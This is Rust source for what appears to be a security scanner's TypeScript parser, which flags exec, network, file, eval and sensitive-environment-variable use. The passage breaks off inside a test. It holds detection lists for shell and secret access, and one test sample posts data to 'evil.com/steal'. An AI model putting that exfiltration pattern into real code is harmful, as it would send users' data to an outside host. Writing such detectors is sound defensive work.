use std::collections::HashSet;
use std::path::{Path, PathBuf};

use once_cell::sync::Lazy;
use regex::Regex;

use super::{CallSite, FunctionDef, FunctionParam, LanguageParser, ParsedFile};
use crate::analysis::cross_file::{sanitizer_category, sanitizer_label, SanitizerCategory};
use crate::error::Result;
use crate::ir::execution_surface::*;
use crate::ir::{ArgumentSource, Language, SourceLocation};

pub struct TypeScriptParser;

// ── Dangerous patterns ───────────────────────────────────────────

static EXEC_PATTERNS: Lazy<Vec<&str>> = Lazy::new(|| {
    vec![
        "exec",
        "execSync",
        "execFile",
        "execFileSync",
        "spawn",
        "spawnSync",
        "child_process.exec",
        "child_process.execSync",
        "child_process.execFile",
        "child_process.execFileSync",
        "child_process.spawn",
        "child_process.spawnSync",
        "cp.exec",
        "cp.execSync",
        "cp.spawn",
        "cp.spawnSync",
        "shelljs.exec",
        "execa",
        "execaSync",
    ]
});

static NETWORK_PATTERNS: Lazy<Vec<&str>> = Lazy::new(|| {
    vec![
        "fetch",
        "http.get",
        "http.request",
        "https.get",
        "https.request",
        "axios",
        "axios.get",
        "axios.post",
        "axios.put",
        "axios.patch",
        "axios.delete",
        "axios.request",
        "got",
        "got.get",
        "got.post",
        "got.put",
        "got.patch",
        "got.delete",
        "request",
        "request.get",
        "request.post",
        "superagent.get",
        "superagent.post",
        "undici.fetch",
        "undici.request",
    ]
});

static FILE_PATTERNS: Lazy<Vec<&str>> = Lazy::new(|| {
    vec![
        "readFile",
        "readFileSync",
        "writeFile",
        "writeFileSync",
        "appendFile",
        "appendFileSync",
        "unlink",
        "unlinkSync",
        "readdir",
        "readdirSync",
        "fs.readFile",
        "fs.readFileSync",
        "fs.writeFile",
        "fs.writeFileSync",
        "fs.appendFile",
        "fs.appendFileSync",
        "fs.unlink",
        "fs.unlinkSync",
        "fs.readdir",
        "fs.readdirSync",
        "fs.promises.readFile",
        "fs.promises.writeFile",
        "fs.promises.unlink",
        "fs.promises.readdir",
        "Deno.readTextFile",
        "Deno.writeTextFile",
        "Deno.readFile",
        "Deno.writeFile",
        "Bun.file",
    ]
});

static DYNAMIC_EXEC_PATTERNS: Lazy<Vec<&str>> = Lazy::new(|| {
    vec![
        "eval",
        "Function",
        "vm.runInThisContext",
        "vm.runInNewContext",
    ]
});

static SENSITIVE_ENV_VARS: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(AWS_|SECRET|TOKEN|PASSWORD|API_KEY|PRIVATE_KEY|CREDENTIALS|AUTH)").unwrap()
});

// Template literal with interpolation: `...${expr}...`
static TEMPLATE_LITERAL_RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"\$\{[^}]+\}").unwrap());

// Sanitizer assignment: const validPath = await validatePath(x)
// Captures: (1) variable name, (2) function name (possibly dotted)
static SANITIZER_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?:const|let|var)\s+(\w+)\s*=\s*(?:await\s+)?(\w+(?:\.\w+)*)\s*\(").unwrap()
});

// ── tree-sitter AST parser ──────────────────────────────────────

#[cfg(feature = "typescript")]
impl LanguageParser for TypeScriptParser {
    fn language(&self) -> Language {
        Language::TypeScript
    }

    fn parse_file(&self, path: &Path, content: &str) -> Result<ParsedFile> {
        let mut parser = tree_sitter::Parser::new();
        let is_tsx = path
            .extension()
            .is_some_and(|ext| ext == "tsx" || ext == "jsx");

        let lang = if is_tsx {
            tree_sitter_typescript::LANGUAGE_TSX
        } else {
            tree_sitter_typescript::LANGUAGE_TYPESCRIPT
        };

        parser
            .set_language(&lang.into())
            .map_err(|e| crate::error::ShieldError::Parse {
                file: path.display().to_string(),
                message: format!("Failed to load TypeScript grammar: {e}"),
            })?;

        let tree = parser
            .parse(content, None)
            .ok_or_else(|| crate::error::ShieldError::Parse {
                file: path.display().to_string(),
                message: "tree-sitter failed to parse TypeScript".into(),
            })?;

        let file_path = PathBuf::from(path);
        let source = content.as_bytes();
        let mut parsed = ParsedFile::default();
        let mut param_names = HashSet::new();

        // Phase 0: Detect sanitizer assignments via regex on source text
        detect_sanitizer_assignments(content, &mut parsed.sanitized_vars);

        // Phase 1: Collect function parameters + function defs
        collect_params(
            tree.root_node(),
            source,
            &file_path,
            &mut param_names,
            &mut parsed,
        );

        // Phase 2: Walk AST for call expressions, call sites, and env accesses
        walk_node(
            tree.root_node(),
            source,
            &file_path,
            &param_names,
            &mut parsed,
        );

        Ok(parsed)
    }
}

/// Recursively collect function/method/arrow parameter names + FunctionDef entries.
#[cfg(feature = "typescript")]
fn collect_params(
    node: tree_sitter::Node,
    source: &[u8],
    file_path: &Path,
    param_names: &mut HashSet<String>,
    parsed: &mut ParsedFile,
) {
    let kind = node.kind();

    // Function declarations, arrow functions, method definitions
    if kind == "function_declaration"
        || kind == "function"
        || kind == "arrow_function"
        || kind == "method_definition"
        || kind == "function_expression"
    {
        let func_name = extract_function_name(node, source).unwrap_or_default();
        let mut func_params = Vec::new();

        if let Some(params_node) = node.child_by_field_name("parameters") {
            for i in 0..params_node.named_child_count() {
                if let Some(param) = params_node.named_child(i) {
                    for name in extract_param_names(param, source) {
                        if name != "this" {
                            param_names.insert(name.clone());
                            func_params.push(name.clone());
                            parsed.function_params.push(FunctionParam {
                                function_name: func_name.clone(),
                                param_name: name,
                                location: loc(file_path, param),
                            });
                        }
                    }
                }
            }
        }

        // Record FunctionDef if we have a name
        if !func_name.is_empty() {
            let is_exported = is_exported_node(node, source);
            parsed.function_defs.push(FunctionDef {
                name: func_name,
                params: func_params,
                is_exported,
                location: loc(file_path, node),
            });
        }
    }

    // Recurse
    for i in 0..node.named_child_count() {
        if let Some(child) = node.named_child(i) {
            collect_params(child, source, file_path, param_names, parsed);
        }
    }
}

/// Check if a function node is exported (has `export` keyword in ancestors or declaration).
#[cfg(feature = "typescript")]
fn is_exported_node(node: tree_sitter::Node, source: &[u8]) -> bool {
    // Check if the function/arrow is inside an export_statement
    let mut current = node;
    while let Some(parent) = current.parent() {
        let pk = parent.kind();
        if pk == "export_statement" {
            return true;
        }
        // Stop at top-level statements
        if pk == "program" || pk == "statement_block" {
            break;
        }
        current = parent;
    }
    // Check for `module.exports` pattern — look at the parent variable_declarator
    // e.g., module.exports.func = function(...) {}
    if let Some(parent) = node.parent() {
        let parent_text = node_text(parent, source);
        if parent_text.contains("module.exports") || parent_text.contains("exports.") {
            return true;
        }
    }
    false
}

/// Extract a function's name from its AST node.
#[cfg(feature = "typescript")]
fn extract_function_name(node: tree_sitter::Node, source: &[u8]) -> Option<String> {
    // For function_declaration/method_definition: name field
    if let Some(name_node) = node.child_by_field_name("name") {
        return Some(node_text(name_node, source).to_string());
    }

    // For arrow functions assigned to variables: look at parent
    // const handler = async (params) => { ... }
    if node.kind() == "arrow_function" || node.kind() == "function_expression" {
        if let Some(parent) = node.parent() {
            if parent.kind() == "variable_declarator" {
                if let Some(name_node) = parent.child_by_field_name("name") {
                    return Some(node_text(name_node, source).to_string());
                }
            }
        }
    }

    None
}

/// Extract parameter name(s) from a formal_parameters child node.
/// Returns a Vec because destructured patterns yield multiple names.
#[cfg(feature = "typescript")]
fn extract_param_names(node: tree_sitter::Node, source: &[u8]) -> Vec<String> {
    match node.kind() {
        // required_parameter or optional_parameter: has "pattern" field
        "required_parameter" | "optional_parameter" => {
            if let Some(pattern) = node.child_by_field_name("pattern") {
                if pattern.kind() == "identifier" {
                    return vec![node_text(pattern, source).to_string()];
                }
                // Destructured object pattern: { url, name } => ["url", "name"]
                if pattern.kind() == "object_pattern" {
                    return extract_object_pattern_names(pattern, source);
                }
                // Destructured array pattern: [a, b] => ["a", "b"]
                if pattern.kind() == "array_pattern" {
                    return extract_array_pattern_names(pattern, source);
                }
            }
            vec![]
        }
        // Rest parameter: ...args
        "rest_pattern" => {
            for i in 0..node.named_child_count() {
                if let Some(child) = node.named_child(i) {
                    if child.kind() == "identifier" {
                        return vec![node_text(child, source).to_string()];
                    }
                }
            }
            vec![]
        }
        // Plain identifier (JS-style params without type annotations)
        "identifier" => vec![node_text(node, source).to_string()],
        _ => vec![],
    }
}

/// Extract property names from an object destructuring pattern: { url, name }
#[cfg(feature = "typescript")]
fn extract_object_pattern_names(node: tree_sitter::Node, source: &[u8]) -> Vec<String> {
    let mut names = Vec::new();
    for i in 0..node.named_child_count() {
        if let Some(child) = node.named_child(i) {
            match child.kind() {
                // shorthand_property_identifier_pattern: { url } => "url"
                "shorthand_property_identifier_pattern" => {
                    names.push(node_text(child, source).to_string());
                }
                // pair_pattern: { url: myUrl } => "myUrl"
                "pair_pattern" => {
                    if let Some(value) = child.child_by_field_name("value") {
                        if value.kind() == "identifier" {
                            names.push(node_text(value, source).to_string());
                        }
                    }
                }
                _ => {}
            }
        }
    }
    names
}

/// Extract names from an array destructuring pattern: [a, b]
#[cfg(feature = "typescript")]
fn extract_array_pattern_names(node: tree_sitter::Node, source: &[u8]) -> Vec<String> {
    let mut names = Vec::new();
    for i in 0..node.named_child_count() {
        if let Some(child) = node.named_child(i) {
            if child.kind() == "identifier" {
                names.push(node_text(child, source).to_string());
            }
        }
    }
    names
}

/// Walk the AST looking for call_expression and member_expression (for env access).
#[cfg(feature = "typescript")]
fn walk_node(
    node: tree_sitter::Node,
    source: &[u8],
    file_path: &Path,
    param_names: &HashSet<String>,
    parsed: &mut ParsedFile,
) {
    let kind = node.kind();

    // Check for process.env access: process.env.VAR or process.env["VAR"]
    if kind == "member_expression" || kind == "subscript_expression" {
        let text = node_text(node, source);
        if text.starts_with("process.env") {
            let var_name = extract_env_var_name(node, source);
            if let Some(name) = &var_name {
                let is_sensitive = SENSITIVE_ENV_VARS.is_match(name);
                parsed.env_accesses.push(EnvAccess {
                    var_name: ArgumentSource::Literal(name.clone()),
                    is_sensitive,
                    location: loc(file_path, node),
                });
            }
        }
    }

    // Check for call_expression
    if kind == "call_expression" {
        if let Some(func_node) = node.child_by_field_name("function") {
            let func_name = resolve_call_name(func_node, source);

            // Classify all arguments (not just the first) for CallSite recording
            let args_node = node.child_by_field_name("arguments");
            let all_arg_sources =
                classify_all_arguments(args_node, source, param_names, &parsed.sanitized_vars);

            // First argument source for existing detector logic
            let arg_source = all_arg_sources
                .first()
                .cloned()
                .unwrap_or(ArgumentSource::Unknown);

            // Record CallSite for cross-file analysis
            let caller_name = find_enclosing_function(node, source);
            parsed.call_sites.push(CallSite {
                callee: func_name.clone(),
                arguments: all_arg_sources,
                caller: caller_name,
                location: loc(file_path, node),
            });

            // Command execution
            if matches_pattern(&func_name, &EXEC_PATTERNS) {
                parsed.commands.push(CommandInvocation {
                    function: func_name.clone(),
                    command_arg: arg_source.clone(),
                    location: loc(file_path, node),
                });
            }

            // Network operations
            if matches_pattern(&func_name, &NETWORK_PATTERNS) {
                let full_args_text = node
                    .child_by_field_name("arguments")
                    .map(|a| node_text(a, source).to_string())
                    .unwrap_or_default();
                let sends_data = func_name.contains("post")
                    || func_name.contains("put")
                    || func_name.contains("patch")
                    || full_args_text.contains("body:")
                    || full_args_text.contains("data:");
                let method = if func_name.contains("get") {
                    Some("GET".into())
                } else if func_name.contains("post") {
                    Some("POST".into())
                } else if func_name.contains("put") {
                    Some("PUT".into())
                } else {
                    None
                };
                parsed.network_operations.push(NetworkOperation {
                    function: func_name.clone(),
                    url_arg: arg_source.clone(),
                    method,
                    sends_data,
                    location: loc(file_path, node),
                });
            }

            // Dynamic execution
            if DYNAMIC_EXEC_PATTERNS.contains(&func_name.as_str()) {
                parsed.dynamic_exec.push(DynamicExec {
                    function: func_name.clone(),
                    code_arg: arg_source.clone(),
                    location: loc(file_path, node),
                });
            }

            // File operations
            if matches_pattern(&func_name, &FILE_PATTERNS) {
                let op_type = if func_name.contains("write") || func_name.contains("append") {
                    FileOpType::Write
                } else if func_name.contains("unlink") {
                    FileOpType::Delete
                } else if func_name.contains("readdir") {
                    FileOpType::List
                } else {
                    FileOpType::Read
                };
                parsed.file_operations.push(FileOperation {
                    operation: op_type,
                    path_arg: arg_source.clone(),
                    location: loc(file_path, node),
                });
            }
        }
    }

    // Recurse into children (skip already-processed subtrees)
    for i in 0..node.named_child_count() {
        if let Some(child) = node.named_child(i) {
            walk_node(child, source, file_path, param_names, parsed);
        }
    }
}

/// Classify all arguments in a call expression (tree-sitter path).
#[cfg(feature = "typescript")]
fn classify_all_arguments(
    args_node: Option<tree_sitter::Node>,
    source: &[u8],
    param_names: &HashSet<String>,
    sanitized_vars: &HashSet<String>,
) -> Vec<ArgumentSource> {
    let Some(args) = args_node else {
        return Vec::new();
    };
    let mut result = Vec::new();
    for i in 0..args.named_child_count() {
        if let Some(arg) = args.named_child(i) {
            let arg_text = node_text(arg, source).to_string();
            result.push(classify_argument_with_sanitizers(
                &arg_text,
                param_names,
                sanitized_vars,
            ));
        }
    }
    result
}

/// Find the enclosing function name for a node (for caller tracking).
#[cfg(feature = "typescript")]
fn find_enclosing_function(node: tree_sitter::Node, source: &[u8]) -> Option<String> {
    let mut current = node;
    while let Some(parent) = current.parent() {
        let pk = parent.kind();
        if pk == "function_declaration"
            || pk == "function"
            || pk == "arrow_function"
            || pk == "method_definition"
            || pk == "function_expression"
        {
            return extract_function_name(parent, source);
        }
        current = parent;
    }
    None
}

/// Resolve a call expression's function name from its AST node.
/// Handles: identifier, member_expression chains (a.b.c), optional_chain.
#[cfg(feature = "typescript")]
fn resolve_call_name(node: tree_sitter::Node, source: &[u8]) -> String {
    match node.kind() {
        "identifier" => node_text(node, source).to_string(),
        "member_expression" | "optional_chain_expression" => {
            // Flatten the member chain: a.b.c
            node_text(node, source).replace(['\n', ' '], "").to_string()
        }
        _ => node_text(node, source).to_string(),
    }
}

/// Extract environment variable name from process.env access.
#[cfg(feature = "typescript")]
fn extract_env_var_name(node: tree_sitter::Node, source: &[u8]) -> Option<String> {
    let text = node_text(node, source);
    // process.env.VAR_NAME
    if let Some(rest) = text.strip_prefix("process.env.") {
        return Some(rest.to_string());
    }
    // process.env["VAR_NAME"] or process.env['VAR_NAME']
    if node.kind() == "subscript_expression" {
        if let Some(index) = node.child_by_field_name("index") {
            let idx_text = node_text(index, source);
            let trimmed = idx_text.trim_matches('"').trim_matches('\'').to_string();
            if !trimmed.is_empty() {
                return Some(trimmed);
            }
        }
    }
    None
}

/// Get the text of a tree-sitter node.
#[cfg(feature = "typescript")]
fn node_text<'a>(node: tree_sitter::Node, source: &'a [u8]) -> &'a str {
    node.utf8_text(source).unwrap_or("")
}

/// Build a SourceLocation from a tree-sitter node (1-indexed lines).
#[cfg(feature = "typescript")]
fn loc(file: &Path, node: tree_sitter::Node) -> SourceLocation {
    let start = node.start_position();
    let end = node.end_position();
    SourceLocation {
        file: file.to_path_buf(),
        line: start.row + 1,
        column: start.column,
        end_line: Some(end.row + 1),
        end_column: Some(end.column),
    }
}

// ── Shared sanitizer detection ──────────────────────────────────

/// Detect sanitizer assignments in source code and populate sanitized_vars.
/// Matches patterns like: `const validPath = await validatePath(x)`
fn detect_sanitizer_assignments(content: &str, sanitized_vars: &mut HashSet<String>) {
    for cap in SANITIZER_ASSIGN_RE.captures_iter(content) {
        let var_name = &cap[1];
        let func_name = &cap[2];
        if sanitizer_category(func_name)
            .is_some_and(|category| !matches!(category, SanitizerCategory::Redaction))
        {
            sanitized_vars.insert(var_name.to_string());
            if let Some(label) = sanitizer_label(func_name) {
                sanitized_vars.insert(sanitized_var_marker(var_name, &label));
            }
        }
    }
}

fn sanitized_var_marker(var_name: &str, sanitizer_label: &str) -> String {
    format!("{var_name}::{sanitizer_label}")
}

fn sanitized_label_for_var(ident: &str, sanitized_vars: &HashSet<String>) -> Option<String> {
    for category in [
        SanitizerCategory::Path,
        SanitizerCategory::Network,
        SanitizerCategory::TypeCoercion,
    ] {
        let prefix = format!("{}:", category.as_str());
        if let Some(marker) = sanitized_vars
            .iter()
            .find(|value| value.starts_with(&format!("{ident}::{prefix}")))
        {
            return marker.split_once("::").map(|(_, label)| label.to_string());
        }
    }

    sanitized_vars.contains(ident).then(|| ident.to_string())
}

/// Classify an argument, considering sanitized variables.
fn classify_argument_with_sanitizers(
    arg_text: &str,
    param_names: &HashSet<String>,
    sanitized_vars: &HashSet<String>,
) -> ArgumentSource {
    let first_arg = arg_text.split(',').next().unwrap_or("").trim();

    if first_arg.is_empty() {
        return ArgumentSource::Unknown;
    }

    // Check if this is a sanitized variable (before other checks)
    let ident = first_arg.split('.').next().unwrap_or(first_arg);
    let ident = ident.split('[').next().unwrap_or(ident);
    if let Some(sanitizer) = sanitized_label_for_var(ident, sanitized_vars) {
        return ArgumentSource::Sanitized { sanitizer };
    }

    // Delegate to existing classification
    classify_argument_text(first_arg, param_names)
}

// ── Regex fallback parser (when typescript feature is disabled) ──

#[cfg(not(feature = "typescript"))]
static CALL_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?m)(\w+(?:\.\w+)*)\s*\(([^)]*)\)").unwrap());

#[cfg(not(feature = "typescript"))]
static ENV_ACCESS_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?m)process\.env\s*(?:\[\s*["']([^"']+)["']\s*\]|\.([A-Z_][A-Z0-9_]*))"#).unwrap()
});

#[cfg(not(feature = "typescript"))]
static FUNC_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?m)(?:(?:export\s+)?(?:async\s+)?function\s+(\w+)\s*\(([^)]*)\)|(?:const|let|var)\s+(\w+)\s*=\s*(?:async\s+)?\(([^)]*)\)\s*(?:=>|:\s*\w+\s*=>)|(\w+)\s*\(([^)]*)\)\s*(?::\s*\w+\s*)?\{)"
    ).unwrap()
});

#[cfg(not(feature = "typescript"))]
impl LanguageParser for TypeScriptParser {
    fn language(&self) -> Language {
        Language::TypeScript
    }

    fn parse_file(&self, path: &Path, content: &str) -> Result<ParsedFile> {
        let mut parsed = ParsedFile::default();
        let file_path = PathBuf::from(path);
        let mut param_names = HashSet::new();

        // Phase 0: Detect sanitizer assignments
        detect_sanitizer_assignments(content, &mut parsed.sanitized_vars);

        // Collect function parameter names + FunctionDef entries
        for cap in FUNC_DEF_RE.captures_iter(content) {
            let params_str = cap
                .get(2)
                .or_else(|| cap.get(4))
                .or_else(|| cap.get(6))
                .map(|m| m.as_str())
                .unwrap_or("");
            let func_name = cap
                .get(1)
                .or_else(|| cap.get(3))
                .or_else(|| cap.get(5))
                .map(|m| m.as_str())
                .unwrap_or("");

            let full_match = cap.get(0).map(|m| m.as_str()).unwrap_or("");
            let is_exported = full_match.starts_with("export");

            let mut func_params = Vec::new();
            for param in params_str.split(',') {
                let param = param.trim();
                if param.starts_with('{') || param.starts_with('[') {
                    continue;
                }
                let param = param.split(':').next().unwrap_or("").trim();
                let param = param.split('=').next().unwrap_or("").trim();
                let param = param.trim_start_matches("...");
                let param = param.trim_end_matches('?');
                if !param.is_empty() && param != "this" {
                    param_names.insert(param.to_string());
                    func_params.push(param.to_string());
                    parsed.function_params.push(FunctionParam {
                        function_name: func_name.to_string(),
                        param_name: param.to_string(),
                        location: regex_loc(&file_path, 0),
                    });
                }
            }

            if !func_name.is_empty() {
                parsed.function_defs.push(FunctionDef {
                    name: func_name.to_string(),
                    params: func_params,
                    is_exported,
                    location: regex_loc(&file_path, 0),
                });
            }
        }

        // Scan line by line
        for (line_idx, line) in content.lines().enumerate() {
            let line_num = line_idx + 1;
            let trimmed = line.trim();

            if trimmed.starts_with("//") || trimmed.starts_with('*') || trimmed.starts_with("/*") {
                continue;
            }

            for cap in ENV_ACCESS_RE.captures_iter(line) {
                let var_name = cap
                    .get(1)
                    .or_else(|| cap.get(2))
                    .map(|m| m.as_str().to_string())
                    .unwrap_or_default();
                let is_sensitive = SENSITIVE_ENV_VARS.is_match(&var_name);
                parsed.env_accesses.push(EnvAccess {
                    var_name: ArgumentSource::Literal(var_name),
                    is_sensitive,
                    location: regex_loc(&file_path, line_num),
                });
            }

            for cap in CALL_RE.captures_iter(line) {
                let func_name = &cap[1];
                let args_str = &cap[2];
                let arg_source = classify_argument_with_sanitizers(
                    args_str,
                    &param_names,
                    &parsed.sanitized_vars,
                );

                // Record CallSite
                let all_args = args_str
                    .split(',')
                    .map(|a| {
                        classify_argument_with_sanitizers(
                            a.trim(),
                            &param_names,
                            &parsed.sanitized_vars,
                        )
                    })
                    .collect::<Vec<_>>();
                parsed.call_sites.push(CallSite {
                    callee: func_name.to_string(),
                    arguments: all_args,
                    caller: None, // Regex path can't easily determine enclosing function
                    location: regex_loc(&file_path, line_num),
                });

                if matches_pattern(func_name, &EXEC_PATTERNS) {
                    parsed.commands.push(CommandInvocation {
                        function: func_name.to_string(),
                        command_arg: arg_source.clone(),
                        location: regex_loc(&file_path, line_num),
                    });
                }

                if matches_pattern(func_name, &NETWORK_PATTERNS) {
                    let sends_data = func_name.contains("post")
                        || func_name.contains("put")
                        || func_name.contains("patch")
                        || args_str.contains("body:")
                        || args_str.contains("data:");
                    let method = if func_name.contains("get") {
                        Some("GET".into())
                    } else if func_name.contains("post") {
                        Some("POST".into())
                    } else if func_name.contains("put") {
                        Some("PUT".into())
                    } else {
                        None
                    };
                    parsed.network_operations.push(NetworkOperation {
                        function: func_name.to_string(),
                        url_arg: arg_source.clone(),
                        method,
                        sends_data,
                        location: regex_loc(&file_path, line_num),
                    });
                }

                if DYNAMIC_EXEC_PATTERNS.contains(&func_name) {
                    parsed.dynamic_exec.push(DynamicExec {
                        function: func_name.to_string(),
                        code_arg: arg_source.clone(),
                        location: regex_loc(&file_path, line_num),
                    });
                }

                if matches_pattern(func_name, &FILE_PATTERNS) {
                    let op_type = if func_name.contains("write") || func_name.contains("append") {
                        FileOpType::Write
                    } else if func_name.contains("unlink") {
                        FileOpType::Delete
                    } else if func_name.contains("readdir") {
                        FileOpType::List
                    } else {
                        FileOpType::Read
                    };
                    parsed.file_operations.push(FileOperation {
                        operation: op_type,
                        path_arg: arg_source.clone(),
                        location: regex_loc(&file_path, line_num),
                    });
                }
            }
        }

        Ok(parsed)
    }
}

#[cfg(not(feature = "typescript"))]
fn regex_loc(file: &Path, line: usize) -> SourceLocation {
    SourceLocation {
        file: file.to_path_buf(),
        line,
        column: 0,
        end_line: None,
        end_column: None,
    }
}

// ── Shared helpers ──────────────────────────────────────────────

/// Check if a function name matches any pattern in the list.
fn matches_pattern(func_name: &str, patterns: &[&str]) -> bool {
    patterns
        .iter()
        .any(|p| func_name == *p || func_name.ends_with(p))
}

/// Classify an argument text to determine its source.
fn classify_argument_text(arg_text: &str, param_names: &HashSet<String>) -> ArgumentSource {
    let first_arg = arg_text.split(',').next().unwrap_or("").trim();

    if first_arg.is_empty() {
        return ArgumentSource::Unknown;
    }

    // String literal (double or single quoted)
    if (first_arg.starts_with('"') && first_arg.ends_with('"'))
        || (first_arg.starts_with('\'') && first_arg.ends_with('\''))
    {
        if first_arg.len() >= 2 {
            let val = &first_arg[1..first_arg.len() - 1];
            return ArgumentSource::Literal(val.to_string());
        }
        return ArgumentSource::Literal(String::new());
    }

    // Template literal with interpolation: `...${var}...`
    if first_arg.starts_with('`') {
        if TEMPLATE_LITERAL_RE.is_match(first_arg) {
            return ArgumentSource::Interpolated;
        }
        let val = first_arg.trim_matches('`');
        return ArgumentSource::Literal(val.to_string());
    }

    // String concatenation with +
    if first_arg.contains('+') && (first_arg.contains('"') || first_arg.contains('\'')) {
        return ArgumentSource::Interpolated;
    }

    // process.env reference
    if first_arg.contains("process.env") {
        return ArgumentSource::EnvVar {
            name: first_arg.to_string(),
        };
    }

    // Known function parameter
    let ident = first_arg.split('.').next().unwrap_or(first_arg);
    let ident = ident.split('[').next().unwrap_or(ident);
    if param_names.contains(ident) {
        return ArgumentSource::Parameter {
            name: ident.to_string(),
        };
    }

    ArgumentSource::Unknown
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_exec_with_param() {
        let code = r#"
import { exec } from "child_process";

function runCommand(command: string) {
    exec(command);
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.commands.len(), 1);
        assert!(matches!(
            parsed.commands[0].command_arg,
            ArgumentSource::Parameter { .. }
        ));
    }

    #[test]
    fn detects_spawn_with_interpolation() {
        let code = r#"
function run(cmd: string) {
    exec(`${cmd} --flag`);
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.commands.len(), 1);
        assert!(matches!(
            parsed.commands[0].command_arg,
            ArgumentSource::Interpolated
        ));
    }

    #[test]
    fn detects_fetch_with_param() {
        let code = r#"
async function fetchUrl(url: string) {
    const resp = await fetch(url);
    return resp.json();
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.network_operations.len(), 1);
        assert!(matches!(
            parsed.network_operations[0].url_arg,
            ArgumentSource::Parameter { .. }
        ));
    }

    #[test]
    fn safe_literal_url_not_flagged() {
        let code = r#"
async function getHealth() {
    const resp = await fetch("https://api.example.com/health");
    return resp.json();
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.network_operations.len(), 1);
        assert!(matches!(
            parsed.network_operations[0].url_arg,
            ArgumentSource::Literal(_)
        ));
    }

    #[test]
    fn detects_env_var_access() {
        let code = r#"
const apiKey = process.env["OPENAI_API_KEY"];
const secret = process.env.AWS_SECRET_ACCESS_KEY;
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.env_accesses.len(), 2);
        assert!(parsed.env_accesses[0].is_sensitive);
        assert!(parsed.env_accesses[1].is_sensitive);
    }

    #[test]
    fn detects_eval() {
        let code = r#"
function execute(code: string) {
    eval(code);
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.dynamic_exec.len(), 1);
        assert!(matches!(
            parsed.dynamic_exec[0].code_arg,
            ArgumentSource::Parameter { .. }
        ));
    }

    #[test]
    fn detects_file_operations() {
        let code = r#"
import fs from "fs";

function readConfig(path: string) {
    return fs.readFileSync(path, "utf-8");
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.file_operations.len(), 1);
        assert!(matches!(
            parsed.file_operations[0].path_arg,
            ArgumentSource::Parameter { .. }
        ));
    }

    #[test]
    fn detects_arrow_function_params() {
        let code = r#"
const handler = async (url: string) => {
    const resp = await fetch(url);
    return resp.text();
};
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.network_operations.len(), 1);
        assert!(matches!(
            parsed.network_operations[0].url_arg,
            ArgumentSource::Parameter { .. }
        ));
    }

    #[test]
    fn detects_axios_post() {
        let code = r#"
async function exfiltrate(data: string) {
    await axios.post("https://evil.com/steal", { body: data });
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.network_operations.len(), 1);
        assert!(parsed.network_operations[0].sends_data);
    }

    // ── Tests requiring tree-sitter AST (multi-line, TSX, accurate positions) ──

    #[cfg(feature = "typescript")]
    #[test]
    fn detects_multiline_exec_call() {
        let code = r#"
function runCommand(command: string) {
    exec(
        command,
        { encoding: "utf-8" }
    );
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.commands.len(), 1);
        assert!(matches!(
            parsed.commands[0].command_arg,
            ArgumentSource::Parameter { .. }
        ));
    }

    #[cfg(feature = "typescript")]
    #[test]
    fn detects_multiline_fetch() {
        let code = r#"
async function sendData(url: string) {
    const resp = await fetch(
        url,
        {
            method: "POST",
            body: JSON.stringify({ key: "value" }),
        }
    );
    return resp.json();
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.network_operations.len(), 1);
        assert!(matches!(
            parsed.network_operations[0].url_arg,
            ArgumentSource::Parameter { .. }
        ));
    }

    #[cfg(feature = "typescript")]
    #[test]
    fn detects_nested_callback_exec() {
        let code = r#"
function runCommand(command: string): Promise<string> {
    return new Promise((resolve, reject) => {
        exec(command, (error, stdout) => {
            if (error) reject(error);
            resolve(stdout);
        });
    });
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.commands.len(), 1);
        assert!(matches!(
            parsed.commands[0].command_arg,
            ArgumentSource::Parameter { .. }
        ));
    }

    #[cfg(feature = "typescript")]
    #[test]
    fn accurate_line_numbers() {
        let code = r#"
// line 2
// line 3
function dangerous(cmd: string) {
    exec(cmd);
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.commands.len(), 1);
        // exec(cmd) is on line 5
        assert_eq!(parsed.commands[0].location.line, 5);
    }

    #[cfg(feature = "typescript")]
    #[test]
    fn handles_tsx_file() {
        let code = r#"
import React from "react";

const Component = ({ url }: { url: string }) => {
    const data = fetch(url);
    return <div>{data}</div>;
};
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("component.tsx"), code)
            .unwrap();
        assert_eq!(parsed.network_operations.len(), 1);
        assert!(matches!(
            parsed.network_operations[0].url_arg,
            ArgumentSource::Parameter { .. }
        ));
    }

    // ── Cross-file support tests ──

    #[test]
    fn extracts_function_defs() {
        let code = r#"
export async function readFileContent(filePath: string) {
    return fs.readFile(filePath, "utf-8");
}

function internalHelper(x: number) {
    return x + 1;
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("lib.ts"), code)
            .unwrap();
        assert!(parsed.function_defs.len() >= 2);
        let exported = parsed
